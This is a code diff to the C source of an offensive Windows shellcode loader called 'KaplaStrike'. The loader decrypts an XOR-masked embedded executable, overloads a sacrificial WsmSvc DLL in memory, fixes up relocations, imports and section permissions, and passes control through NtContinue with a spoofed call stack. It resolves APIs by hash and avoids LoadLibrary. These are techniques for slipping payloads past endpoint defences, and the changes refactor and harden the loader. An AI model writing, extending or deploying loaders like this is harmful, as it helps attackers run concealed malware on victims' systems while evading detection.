@@ -1,16 +1,18 @@
 /**
- * Console EXE to Shellcode Loader - WsmSvc Edition
+ * KaplaStrike - Console EXE to Shellcode Converter
  * 
  * Converts Windows console EXE files to position-independent shellcode
- * that executes via sacrificial WsmSvc DLL injection.
+ * that executes via WsmSvc sacrificial DLL module overloading.
  * 
  * Features:
- * - XOR encryption of embedded EXE payload
- * - WsmSvc sacrificial DLL module overloading
- * - Section permission management
- * - IAT resolution and hooking
- * - NtContinue-based stack spoofing
- * - Command-line argument parsing
+ * - XOR encryption of embedded EXE payload at compile time
+ * - WsmSvc SEC_IMAGE module overloading (no LoadLibrary, no CFG)
+ * - Section relocation and IAT resolution
+ * - NtContinue-based stack spoofing for clean entry transfer
+ * - Command-line argument parsing and passing
+ * - x64 Windows only
+ * 
+ * No PICO, no sleep masking, no DLL support - pure EXE execution.
  */
 
 #include <winsock2.h>
@@ -56,22 +58,6 @@ static char * findMask()        { return (char *)&__MASKDATA__; }
 #define GETPROCADDRESS_HASH   0x7C0DFCAA
 #define GETMODULEHANDLEA_HASH 0xD3324904
 
-#define WIN32_FUNC(x) __typeof__(x) * x
-typedef struct { 
-    WIN32_FUNC(LoadLibraryA); 
-    WIN32_FUNC(GetProcAddress); 
-    WIN32_FUNC(GetModuleHandleA); 
-    WIN32_FUNC(VirtualAlloc);
-    WIN32_FUNC(VirtualProtect);
-} WIN32FUNCS;
-
-void findNeededFunctions(WIN32FUNCS * funcs) {
-    char * hModule          = (char *)findModuleByHash(KERNEL32DLL_HASH);
-    funcs->LoadLibraryA     = (__typeof__(LoadLibraryA)    *) findFunctionByHash(hModule, LOADLIBRARYA_HASH);
-    funcs->GetProcAddress   = (__typeof__(GetProcAddress)  *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
-    funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA)*) findFunctionByHash(hModule, GETMODULEHANDLEA_HASH);
-}
-
 /* ── PE Context for Console EXE Execution ──────────────────────────── */
 
 typedef struct {
@@ -79,7 +65,6 @@ typedef struct {
     PVOID           base_address;
     SIZE_T          image_size;
     DWORD           entry_point_rva;
-    LPSTR           command_line;
     int             argc;
     char*           argv[256];
 } PE_CONTEXT;
@@ -95,7 +80,7 @@ static void parse_command_line(PE_CONTEXT* ctx, const char* cmdline) {
         return;
     }
 
-    /* Allocate a buffer to work with */
+    /* Allocate buffer for command line parsing */
     char* cmd_buf = (char*)KERNEL32$VirtualAlloc(NULL, 16384, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!cmd_buf) {
         ctx->argc = 1;
@@ -174,7 +159,7 @@ BOOL LoadSacrificialDll(IN LPCWSTR szDllFilePath, OUT HMODULE * phModule) {
 
 /* ── Transfer Execution via NtContinue (Stack Spoofing) ───────────── */
 
-VOID TransferExecutionViaStack(PVOID entry_point, PVOID hInstance, int argc, char** argv) {
+VOID TransferExecutionViaStack(PVOID entry_point, int argc, char** argv) {
     PVOID kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
     PVOID ntdll    = KERNEL32$GetModuleHandleA("ntdll.dll");
 
@@ -193,9 +178,14 @@ VOID TransferExecutionViaStack(PVOID entry_point, PVOID hInstance, int argc, cha
     if (!fake_stack) return;
 
     ULONG_PTR rsp = ((ULONG_PTR)fake_stack + 0x40000) & ~(ULONG_PTR)0xF;
-    rsp -= 8; *(PVOID *)rsp = NULL;
-    rsp -= ruts_stack_size; *(PVOID *)rsp = ruts_ret;
-    rsp -= btit_stack_size; *(PVOID *)rsp = btit_ret;
+    rsp -= 8;
+    *(PVOID *)rsp = NULL;
+    
+    rsp -= ruts_stack_size;
+    *(PVOID *)rsp = ruts_ret;
+    
+    rsp -= btit_stack_size;
+    *(PVOID *)rsp = btit_ret;
 
     CONTEXT ctx;
     NTDLL$memset(&ctx, 0, sizeof(ctx));
@@ -203,6 +193,7 @@ VOID TransferExecutionViaStack(PVOID entry_point, PVOID hInstance, int argc, cha
     NTDLL$RtlCaptureContext(&ctx);
     ctx.Rip = (DWORD64)entry_point;
     ctx.Rsp = (DWORD64)rsp;
+    
     /* Console main(int argc, char* argv[]) */
     ctx.Rcx = (DWORD64)argc;
     ctx.Rdx = (DWORD64)argv;
@@ -213,43 +204,35 @@ VOID TransferExecutionViaStack(PVOID entry_point, PVOID hInstance, int argc, cha
 
 /* ── Fix Section Permissions ───────────────────────────────────────── */
 
-void fix_section_permissions(DLLDATA * dll, char * src, char * dst) {
-    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
-    IMAGE_SECTION_HEADER * section_hdr   = NULL;
-    void                 * section_dst   = NULL;
-    DWORD                  section_size  = 0;
-    DWORD                  new_protect   = 0;
-    DWORD                  old_protect   = 0;
+static void fix_section_permissions(DLLDATA * dll, char * dst) {
+    DWORD section_count = dll->NtHeaders->FileHeader.NumberOfSections;
+    IMAGE_SECTION_HEADER * section_hdr = IMAGE_FIRST_SECTION(dll->NtHeaders);
+    DWORD old_protect = 0;
 
-    section_hdr = (IMAGE_SECTION_HEADER *) PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
-
-    for (int i = 0; i < section_count; i++) {
-        if (!section_hdr->SizeOfRawData || !section_hdr->VirtualAddress) {
-            section_hdr++;
+    for (DWORD i = 0; i < section_count; i++) {
+        if (!section_hdr[i].VirtualAddress || !section_hdr[i].SizeOfRawData) {
             continue;
         }
 
-        section_dst  = dst + section_hdr->VirtualAddress;
-        section_size = section_hdr->SizeOfRawData;
-        new_protect  = 0;
+        PVOID section_addr = (PVOID)((ULONG_PTR)dst + section_hdr[i].VirtualAddress);
+        SIZE_T section_size = section_hdr[i].SizeOfRawData;
+        DWORD protect = PAGE_READWRITE;
 
-        if (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)
-            new_protect = PAGE_WRITECOPY;
-        if (section_hdr->Characteristics & IMAGE_SCN_MEM_READ)
-            new_protect = PAGE_READONLY;
-        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
-            new_protect = PAGE_READWRITE;
-        if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)
-            new_protect = PAGE_EXECUTE;
-        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
-            new_protect = PAGE_EXECUTE_WRITECOPY;
-        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_READ))
-            new_protect = PAGE_EXECUTE_READ;
-        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE))
-            new_protect = PAGE_EXECUTE_READWRITE;
+        if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+                protect = PAGE_EXECUTE_READWRITE;
+            } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_READ) {
+                protect = PAGE_EXECUTE_READ;
+            } else {
+                protect = PAGE_EXECUTE;
+            }
+        } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            protect = PAGE_READWRITE;
+        } else if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_READ) {
+            protect = PAGE_READONLY;
+        }
 
-        KERNEL32$VirtualProtect(section_dst, section_size, new_protect, &old_protect);
-        section_hdr++;
+        KERNEL32$VirtualProtect(section_addr, section_size, protect, &old_protect);
     }
 }
 
@@ -268,13 +251,18 @@ void ModuleOverloadEXE(IN LPCWSTR SacrificialDllPath) {
     RESOURCE * masked_exe = (RESOURCE *)findAppendedEXE();
     RESOURCE * mask_key   = (RESOURCE *)findMask();
 
-    char * exe_raw_src = KERNEL32$VirtualAlloc(NULL, masked_exe->len,
-                                                MEM_COMMIT | MEM_RESERVE,
-                                                PAGE_READWRITE);
+    if (!masked_exe || !mask_key || masked_exe->len == 0) {
+        return;
+    }
+
+    char * exe_raw_src = (char*)KERNEL32$VirtualAlloc(NULL, masked_exe->len,
+                                                       MEM_COMMIT | MEM_RESERVE,
+                                                       PAGE_READWRITE);
     if (!exe_raw_src) return;
 
-    for (int i = 0; i < masked_exe->len; i++)
+    for (int i = 0; i < masked_exe->len; i++) {
         exe_raw_src[i] = masked_exe->value[i] ^ mask_key->value[i % mask_key->len];
+    }
 
     ParseDLL(exe_raw_src, &exeData);
 
@@ -296,7 +284,7 @@ void ModuleOverloadEXE(IN LPCWSTR SacrificialDllPath) {
         return;
     }
 
-    /* Make sacrificial memory writable */
+    /* Make sacrificial memory writable section-by-section */
     KERNEL32$VirtualProtect(hSacrificial, 0x1000, PAGE_READWRITE, &oldProt);
 
     PIMAGE_SECTION_HEADER pSacSec = IMAGE_FIRST_SECTION(pSacNt);
@@ -312,13 +300,13 @@ void ModuleOverloadEXE(IN LPCWSTR SacrificialDllPath) {
     /* Zero target region */
     NTDLL$memset((char *)hSacrificial, 0, exeSize);
 
-    /* Copy EXE — LoadDLL handles headers, sections, relocations */
+    /* Copy EXE: LoadDLL handles headers, sections, and relocations */
     LoadDLL(&exeData, exe_raw_src, (char *)hSacrificial);
 
     /* Fix section permissions */
-    fix_section_permissions(&exeData, exe_raw_src, (char *)hSacrificial);
+    fix_section_permissions(&exeData, (char *)hSacrificial);
 
-    /* Protect headers RO */
+    /* Protect headers as read-only */
     KERNEL32$VirtualProtect(hSacrificial,
                              exeData.OptionalHeader->SizeOfHeaders,
                              PAGE_READONLY, &oldProt);
@@ -343,7 +331,7 @@ void ModuleOverloadEXE(IN LPCWSTR SacrificialDllPath) {
     KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);
 
     /* Transfer execution via stack spoofing */
-    TransferExecutionViaStack(entry, hSacrificial, ctx.argc, ctx.argv);
+    TransferExecutionViaStack(entry, ctx.argc, ctx.argv);
 }
 
 /* ── Entry point ───────────────────────────────────────────────────── */
